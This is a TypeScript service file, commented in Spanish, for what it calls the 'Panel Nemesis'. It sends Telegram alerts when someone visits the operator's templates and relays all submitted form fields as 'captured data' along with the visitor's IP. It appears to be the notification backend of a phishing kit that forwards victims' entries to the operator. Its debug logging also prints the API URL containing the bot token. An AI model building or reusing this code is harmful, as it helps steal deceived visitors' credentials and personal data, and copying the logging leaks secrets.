// Servicio para enviar notificaciones vía Telegram Bot API
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

export class TelegramService {
  /**
   * Envía un mensaje de texto a un chat de Telegram
   */
  static async sendMessage(chatId: string, text: string): Promise<boolean> {
    if (!TELEGRAM_BOT_TOKEN) {
      console.warn('TELEGRAM_BOT_TOKEN no está configurado');
      return false;
    }

    try {
      const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: 'HTML',
        }),
      });

      if (!response.ok) {
        const error = await response.json();
        console.error('Error enviando mensaje de Telegram:', error);
        return false;
      }

      return true;
    } catch (error) {
      console.error('Error en TelegramService.sendMessage:', error);
      return false;
    }
  }

  /**
   * Envía una notificación cuando se detecta una nueva sesión
   */
  static async sendSessionNotification(chatId: string, sessionData: {
    templateName: string;
    ipAddress?: string;
    userAgent?: string;
    timestamp: Date;
  }): Promise<boolean> {
    const message = `
🚨 <b>Nueva Sesión Detectada</b>

🌐 <b>Template:</b> ${sessionData.templateName}
📍 <b>IP:</b> ${sessionData.ipAddress || 'No disponible'}
🖥️ <b>Dispositivo:</b> ${sessionData.userAgent?.slice(0, 50) || 'No disponible'}...
⏰ <b>Tiempo:</b> ${sessionData.timestamp.toLocaleString('es-ES', { 
      timeZone: 'America/Mexico_City' 
    })}

¡Revisa tu panel para más detalles!
    `.trim();

    return this.sendMessage(chatId, message);
  }

  /**
   * Envía una notificación cuando el usuario completa un formulario
   */
  static async sendFormSubmissionNotification(chatId: string, submissionData: {
    templateName: string;
    formData: any;
    ipAddress?: string;
    timestamp: Date;
  }): Promise<boolean> {
    const message = `
✅ <b>Formulario Completado</b>

🌐 <b>Template:</b> ${submissionData.templateName}
📍 <b>IP:</b> ${submissionData.ipAddress || 'No disponible'}
⏰ <b>Tiempo:</b> ${submissionData.timestamp.toLocaleString('es-ES', { 
      timeZone: 'America/Mexico_City' 
    })}

<b>Datos capturados:</b>
${Object.entries(submissionData.formData)
  .map(([key, value]) => `• <b>${key}:</b> ${value}`)
  .join('\n')}

¡Nuevo resultado disponible!
    `.trim();

    return this.sendMessage(chatId, message);
  }

  /**
   * Envía un mensaje de prueba para verificar la configuración
   */
  static async sendTestMessage(chatId: string, username: string): Promise<boolean> {
    const message = `
🎉 <b>Conexión Exitosa!</b>

Hola <b>${username}</b>,

Tu cuenta de Telegram ha sido configurada correctamente para recibir notificaciones en tiempo real del Panel Nemesis.

Recibirás alertas cuando:
• 🚨 Alguien acceda a tus templates
• ✅ Se complete un formulario
• 📊 Haya actividad importante

¡Todo listo! 🚀
    `.trim();

    return this.sendMessage(chatId, message);
  }

  /**
   * Verifica si un chat ID es válido enviando un mensaje silencioso
   */
  static async verifyChatId(chatId: string): Promise<{isValid: boolean; error?: string}> {
    console.log(`[TELEGRAM DEBUG] Verificando Chat ID: ${chatId}`);
    console.log(`[TELEGRAM DEBUG] Token disponible: ${!!TELEGRAM_BOT_TOKEN}`);
    console.log(`[TELEGRAM DEBUG] URL: ${TELEGRAM_API_URL}`);

    if (!TELEGRAM_BOT_TOKEN) {
      console.error('[TELEGRAM DEBUG] ERROR: Token de Telegram no configurado');
      return {isValid: false, error: 'Token de Telegram no configurado'};
    }

    try {
      console.log(`[TELEGRAM DEBUG] Enviando petición a Telegram API...`);
      const response = await fetch(`${TELEGRAM_API_URL}/getChat`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
        }),
      });

      console.log(`[TELEGRAM DEBUG] Response status: ${response.status}`);
      console.log(`[TELEGRAM DEBUG] Response ok: ${response.ok}`);

      if (response.ok) {
        console.log(`[TELEGRAM DEBUG] Chat ID válido: ${chatId}`);
        return {isValid: true};
      } else {
        const errorData = await response.json().catch(() => ({}));
        console.log(`[TELEGRAM DEBUG] Error data:`, errorData);
        
        if (errorData.error_code === 400) {
          return {isValid: false, error: 'Chat ID inválido o el bot no puede acceder al chat. Asegúrate de haber iniciado el bot enviando un mensaje.'};
        }
        return {isValid: false, error: `Error del servidor de Telegram: ${errorData.description || 'Desconocido'}`};
      }
    } catch (error) {
      console.error('[TELEGRAM DEBUG] Error verificando Chat ID:', error);
      return {isValid: false, error: 'Error de conexión con Telegram'};
    }
  }
}